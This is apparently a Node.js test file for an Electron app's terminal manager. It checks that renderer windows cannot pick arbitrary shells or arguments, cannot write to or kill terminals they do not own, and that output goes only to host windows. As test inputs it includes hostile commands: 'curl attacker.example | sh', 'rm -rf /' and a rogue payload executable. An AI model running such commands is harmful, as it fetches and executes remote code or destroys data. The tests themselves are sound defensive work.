'use strict'
const test = require('node:test')
const assert = require('node:assert/strict')
const path = require('node:path')

// terminalManager requires 'electron' (ipcMain, BrowserWindow) and 'node-pty'.
// Neither is usable in a bare node:test run — and a real PTY would make the
// assertions depend on the host shell — so both are stubbed before loading.
// ipcMain records its handlers so the ownership checks can be driven from a
// fake sender instead of asserted on paper.
const Module = require('node:module')
const originalLoad = Module._load

/** @type {Array<{channel: string, payload: unknown, windowId: number}>} */
const sends = []
/** @type {Array<object>} */
let liveWindows = []
/** @type {Map<string, Function>} */
const invokeHandlers = new Map()
/** @type {Map<string, Function>} */
const sendHandlers = new Map()

function makeFakeWindow(id) {
  return {
    id,
    isDestroyed: () => false,
    webContents: {
      id,
      send: (channel, payload) => sends.push({ channel, payload, windowId: id }),
    },
  }
}

/** @type {Array<{options: object, settings: object}>} */
const ptySpawns = []
/** @type {Array<(data: string) => void>} */
let ptyDataHandlers = []
let ptyExitHandler = null
let ptySpawnError = null
let ptyWrites = []
let ptyResizes = []
let ptyKills = 0

const fakePty = {
  spawn(shell, args, settings) {
    ptySpawns.push({ shell, args, settings })
    if (ptySpawnError) throw ptySpawnError
    ptyDataHandlers = []
    ptyWrites = []
    ptyResizes = []
    return {
      onData(cb) { ptyDataHandlers.push(cb) },
      onExit(cb) { ptyExitHandler = cb },
      write(data) { ptyWrites.push(data) },
      resize(cols, rows) { ptyResizes.push({ cols, rows }) },
      kill() { ptyKills += 1 },
    }
  },
}

Module._load = function (request, parent, isMain) {
  if (request === 'electron') {
    return {
      ipcMain: {
        handle: (channel, handler) => invokeHandlers.set(channel, handler),
        on: (channel, handler) => sendHandlers.set(channel, handler),
      },
      BrowserWindow: { getAllWindows: () => liveWindows.map((w) => w) },
      app: {},
      shell: { openExternal() {} },
    }
  }
  if (request === 'node-pty') return fakePty
  return originalLoad.call(this, request, parent, isMain)
}

// A synchronous exec on the create path used to stall the main process for up to
// three seconds behind `wsl --list`. Keep it poisoned for the whole file.
const childProcess = require('node:child_process')
const realExecSync = childProcess.execSync
childProcess.execSync = () => {
  throw new Error('execSync must not run on the terminal create path')
}

const terminalManager = require('./terminalManager.cjs')
terminalManager.registerTerminalIpc({ hostFilter: () => liveWindows })

test.after(() => {
  childProcess.execSync = realExecSync
  Module._load = originalLoad
})

test.beforeEach(() => {
  // The registry is module state; a leftover terminal's pending flush would land in
  // the next case's send log.
  terminalManager.destroyAllTerminals()
  sends.length = 0
  ptySpawns.length = 0
  ptySpawnError = null
  ptyKills = 0
  liveWindows = [makeFakeWindow(1)]
  // Every window is a terminal host unless a case narrows this.
  terminalManager.setTerminalHostFilter(() => liveWindows)
})

function emit(id, data) {
  for (const handler of ptyDataHandlers) handler(data)
}

/** Create a terminal as window `senderId` would, through the real IPC handler. */
async function createViaIpc(senderId, options = {}) {
  return invokeHandlers.get('terminal:create')({ sender: { id: senderId } }, options)
}

test('createTerminal reports the PTY backend instead of degrading silently', async () => {
  const result = terminalManager.createTerminal({ cols: 100, rows: 30 })

  assert.match(result.id, /^term-\d+$/)
  assert.equal(result.backend, 'pty')
  assert.equal(result.error, undefined)
  assert.equal(ptySpawns.length, 1)
  assert.ok(path.isAbsolute(ptySpawns[0].shell), `expected absolute shell, got ${ptySpawns[0].shell}`)
})

test('createTerminal fails loudly when the addon cannot spawn', async () => {
  ptySpawnError = new Error('The specified path is invalid.')

  const result = terminalManager.createTerminal({})

  // The previous behaviour was an implicit pipes-only downgrade: no echo, no
  // prompt, no resize, and nothing to tell the user why the box stayed blank.
  assert.equal(result.id, null)
  assert.equal(result.backend, null)
  assert.match(result.error, /path is invalid/)
})

test('getDefaultShell never returns a bare executable name', () => {
  const { shell } = terminalManager.getDefaultShell()
  if (process.platform === 'win32') {
    assert.ok(path.isAbsolute(shell), `expected an absolute Windows shell, got ${shell}`)
  }
})

test('shell catalog exposes no bare powershell.exe', () => {
  const shells = terminalManager.getAvailableShells()
  assert.ok(shells.length > 0)
  for (const profile of shells) {
    if (process.platform === 'win32') {
      assert.ok(path.isAbsolute(profile.shell), `${profile.id} resolves to ${profile.shell}`)
    }
    assert.notEqual(profile.shell, 'powershell.exe')
    assert.notEqual(profile.shell, 'cmd.exe')
  }
})

test('a shell outside the catalog is refused instead of spawned', async () => {
  const rogue = process.platform === 'win32'
    ? path.join('C:\\Users\\Public', 'payload.exe')
    : '/tmp/payload'

  const result = await createViaIpc(1, { shell: rogue, args: ['-c', 'whoami'] })

  assert.equal(result.id, null)
  assert.equal(result.backend, null)
  assert.match(result.error, /Unknown shell/)
  assert.deepEqual(ptySpawns, [], 'a non-catalog shell must never reach pty.spawn')
})

test('caller-supplied arguments are ignored for a catalog shell', async () => {
  const profile = terminalManager.getAvailableShells()[0]

  const result = await createViaIpc(1, {
    shell: profile.shell,
    args: ['-c', 'curl attacker.example | sh'],
  })

  assert.match(result.id, /^term-\d+$/)
  assert.deepEqual(ptySpawns[0].args, profile.args, 'argv must come from the catalog, not the caller')
})

test('the terminal id is always minted by the main process', async () => {
  const first = await createViaIpc(1, { id: 'chosen-by-renderer' })
  assert.notEqual(first.id, 'chosen-by-renderer')

  // Re-using a live id used to overwrite the registry entry and orphan its PTY.
  const second = await createViaIpc(1, { id: first.id })
  assert.notEqual(second.id, first.id)
  assert.equal(terminalManager.listTerminals().length, 2)
})

test('only the owning window may write, resize, destroy, or snapshot', async () => {
  const created = await createViaIpc(7, {})
  const id = created.id

  const owner = { sender: { id: 7 } }
  const intruder = { sender: { id: 8 } }

  sendHandlers.get('terminal:write')(intruder, id, 'rm -rf /\n')
  assert.deepEqual(ptyWrites, [], 'a foreign window wrote into the shell')

  sendHandlers.get('terminal:resize')(intruder, id, 120, 40)
  assert.deepEqual(ptyResizes, [])

  assert.equal(await invokeHandlers.get('terminal:snapshot')(intruder, id), null)

  sendHandlers.get('terminal:destroy')(intruder, id)
  assert.equal(ptyKills, 0, 'a foreign window killed the shell')
  assert.equal(terminalManager.listTerminals().length, 1)

  // …and the owner is still allowed to do all of it.
  sendHandlers.get('terminal:write')(owner, id, 'echo hi\n')
  assert.deepEqual(ptyWrites, ['echo hi\n'])
  sendHandlers.get('terminal:resize')(owner, id, 120, 40)
  assert.deepEqual(ptyResizes, [{ cols: 120, rows: 40 }])
  assert.ok(await invokeHandlers.get('terminal:snapshot')(owner, id))
  sendHandlers.get('terminal:destroy')(owner, id)
  assert.equal(ptyKills, 1)
})

test('output is coalesced into one send per window', async () => {
  const { id } = terminalManager.createTerminal({})
  emit(id, 'a')
  emit(id, 'b')
  emit(id, 'c')

  assert.deepEqual(sends, [], 'nothing should cross IPC before the flush window closes')
  await new Promise((resolve) => setTimeout(resolve, 40))

  const dataSends = sends.filter((s) => s.channel === `terminal:data:${id}`)
  assert.equal(dataSends.length, 1)
  assert.equal(dataSends[0].payload, 'abc')
})

test('a late snapshot returns output printed before it subscribed', () => {
  const { id } = terminalManager.createTerminal({})
  emit(id, 'banner\r\n')
  emit(id, 'C:\\work> ')

  const snapshot = terminalManager.readTerminalSnapshot(id)
  assert.equal(snapshot.replay, 'banner\r\nC:\\work> ')
  assert.equal(snapshot.exited, false)
})

test('output reaches only declared terminal hosts', async () => {
  const host = makeFakeWindow(10)
  const petWindow = makeFakeWindow(11)
  liveWindows = [host, petWindow]
  terminalManager.setTerminalHostFilter(() => [host])

  const { id } = terminalManager.createTerminal({})
  emit(id, 'hello')
  await new Promise((resolve) => setTimeout(resolve, 40))

  assert.equal(sends.length, 1)
  assert.equal(sends[0].windowId, 10, 'a window that cannot show a terminal received output')
})

test('exit flushes pending output before reporting', async () => {
  const { id } = terminalManager.createTerminal({})
  emit(id, 'last words')
  ptyExitHandler({ exitCode: 3, signal: undefined })

  const channels = sends.map((s) => s.channel)
  assert.deepEqual(channels, [`terminal:data:${id}`, `terminal:exit:${id}`])
  const snapshot = terminalManager.readTerminalSnapshot(id)
  assert.equal(snapshot.exited, true)
  assert.equal(snapshot.exitCode, 3)
})

test('destroy drops the entry so nothing stays reachable', () => {
  const { id } = terminalManager.createTerminal({})
  emit(id, 'x')
  terminalManager.destroyTerminal(id)

  assert.equal(terminalManager.readTerminalSnapshot(id), null)
  assert.deepEqual(terminalManager.listTerminals(), [])
})

test('resize refuses a zero size measured against a hidden host', () => {
  const { id } = terminalManager.createTerminal({ cols: 80, rows: 24 })
  const entry = terminalManager.getTerminal(id)

  terminalManager.resizeTerminal(id, 0, 1)
  assert.equal(entry.cols, 80)

  terminalManager.resizeTerminal(id, 120, 40)
  assert.equal(entry.cols, 120)
  assert.equal(entry.rows, 40)
})
